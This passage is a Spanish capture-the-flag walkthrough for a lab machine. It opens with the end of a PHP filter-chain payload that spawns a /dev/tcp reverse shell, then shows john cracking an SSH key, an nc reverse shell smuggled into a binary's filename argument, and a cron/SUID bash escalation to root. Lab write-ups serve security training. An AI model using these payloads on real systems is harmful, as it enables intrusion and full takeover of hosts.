UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=bash -c 'exec bash -i %26>/dev/tcp/192.168.100.26/443 <%261'
```

---

## Escalada de Privilegios
###### Usuario `[ www-data ]`:
En el directorio personal de **marty** si revisamos en esta ruta
```bash
/home/marty/ftp
```

Tenemso un archivo **.note_to_marty.txt** si leemos us contenido
```bash
Marty, si estás leyendo esto, significa que el Delorean sigue en riesgo.
Tuve que proteger el backup del sitio web. La contraseña es una combinación del modelo del auto y el año del primer viaje temporal... en minúsculas, sin espacios.
¡Nos vemos en el futuro!
—Doc
```

Sabiendo que exise el binario de python, nos montamos un servidor para traernos el conprimido a nuestra maquina atacante
```bash
www-data@hillvalley:/home/marty/ftp$ which python3
/usr/bin/python3
```

Montamos el servidor
```bash
www-data@hillvalley:/home/marty/ftp$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Desde nuestra maquina descargamos el archivo zip
```bash
wget http://192.168.100.35:8080/backup.zip
```

para la password desde la web nos dan la informacion
```bash
7z x backup.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2641009 bytes (2580 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 2641009
Enter password (will not be echoed): # delorean1955
```

Ahora necesitamos saber la clave para esa llave **id_rsa** asi que usaremo **john** para realizar fuerza bruta
```bash
ssh2john id_rsa > hash.txt
```

Ejecutamos **john**
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Tenemos la password
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
metallica1       (id_rsa)
```

Ahora necesitamos convertir la llave en publica
```bash
ssh-keygen -y -f id_rsa
Enter passphrase for "id_rsa": # metallica1
```

Ahora procedemos a conectarnos por **ssh**
```bash
ssh -i id_rsa marty@192.168.100.35
Enter passphrase for key 'id_rsa': metallica1
```

###### Usuario `[ marty ]`:
Flag de usuario:
```bash
-rw-r--r-- 1 root     root       16 Jul 14 20:22 user.txt
```

Desde el directorio **home** tenemos este archivo: **.flux_hint**
```bash
He estado trabajando en una nueva forma de sincronizar los scripts del sistema. Cada minuto... como un reloj.
```

Tenemos tareas **cron** programadas, 
```bash
cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#

* * * * * root /usr/local/bin/flux_admin.sh
```

Si listamos el contenido de esa ruta, vemos que no existe tal archivo:
```bash
ls -l /usr/local/bin/
total 32
-rwxr-xr-x 1 root root 16200 Jul 12 20:49 backup_runner
-rwx------ 1 root root 16296 Jul 14 20:44 time_daemon
```

Ahora nos traemos el binario **backup_runner** a nuestra maquina de atacante:
Desde la maquina victima montamos un servidor con python
```bash
marty@hillvalley:/usr/local/bin$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Desde nuestra maquina atacante, descargamos el binario:
```bash
wget http://192.168.100.35:8080/backup_runner
```

Ahora con el comando **strings** vemos las cadenas legibles
```bash
strings backup_runner
/lib64/ld-linux-x86-64.so.2
'=ZU
snprintf
puts
exit
setuid
system
__libc_start_main
```

Damos permisos de ejecucion para poder ejecutarlo y saber como funciona:
```bash
chmod +x backup_runner
```

Ahora ejecutamos el binario:
```bash
./backup_runner
Usage: backup_runner <filename>
```

Nos pide un nombre de archivo, Si le concatenamos un **whoami** vemos que es ejecutado
```bash
./backup_runner id_rsa; whoami
tar: Removing leading `/' from member names
tar: /home/docbrown/docs: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors
hakcer # Output del comando whoami
```

Ahora sabiendo esto procedemos a abusar del binario desde la maquina victima:
```bash
marty@hillvalley:/usr/local/bin$ ./backup_runner testing.txt; whoami
tar: Removing leading `/' from member names
marty
```

Ahora necesitamos obtener una shell como el usuario
```bash
marty@hillvalley:/usr/local/bin$ ./backup_runner ';nc -c /bin/bash 192.168.100.26 444;'
tar: Cowardly refusing to create an empty archive
Try 'tar --help' or 'tar --usage' for more information.
```
###### Usuario `[ Docbrown ]`:
Ahora tenemos una session como este usuario y listando los permisos de este usuario
```bash
sudo -l

User docbrown may run the following commands on hillvaley:
    (root) NOPASSWD: /usr/local/bin/time_daemon
```

Si ejecutamos el binario, Tenemos lo siguiente
```bash
docbrown@hillvalley:/usr/local/bin$ sudo -u root /usr/local/bin/time_daemon
[FLUX] No existe el archivo /tmp/sync: No such file or directory
```

Necesitamos un archivo **sync** por lo que procedemos a crearlo con contenido malicioso para ver que pasa
```bash
# Archivo sync
docbrown@hillvalley:/tmp$ sudo -u root /usr/local/bin/time_daemon
[88MPH] Sincronización completada. Listo para viajar.
```

No funciono los permisos **SUID** a la bash de **root** pero se creo un nuevo archivo:
```bash
docbrown@hillvalley:/usr/local/bin$ ls -la

-rwxr-xr-x  1 root root    20 Sep  3 20:51 flux_admin.sh
```

Sabemos que este archivo es el que se esta ejecutando como tarea **cron**, Asi que necesitamos ver como infectarlo con codigo maliciioso
No fue necesario ya que revisando su contenido, Vemos lo siguiente
```bash
docbrown@hillvalley:/usr/local/bin$ cat flux_admin.sh 
chmod u+s /bin/bash
```

Al momento de que creamos el archivo **sync** con codigo malicioso, y la realiza la sincronizacon tambien se transifirio la inyeccion para otorgar permisos **SUID** a la bash de **root**
Ahora solo revismas los permisos de la **bash**
```bash
docbrown@hillvalley:/usr/local/bin$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 18 19:47 /bin/bash
```

Tenemos permsios **SUID**, Ahora podemos migrar a **root**
```bash
# Comando para escalar al usuario: ( root )
docbrown@hillvalley:/usr/local/bin$ bash -p
bash-5.2#
```

---

## Evidencia de Compromiso
Flag de **root**
```bash
ls -la /root

-rw-r--r--  1 root root    35 Jul 14 20:22 root.txt
```

```bash
# Captura de pantalla o output final
bash-5.2# echo -n "[+] Hacked: $(whoami)"
[+] Hacked: root
```
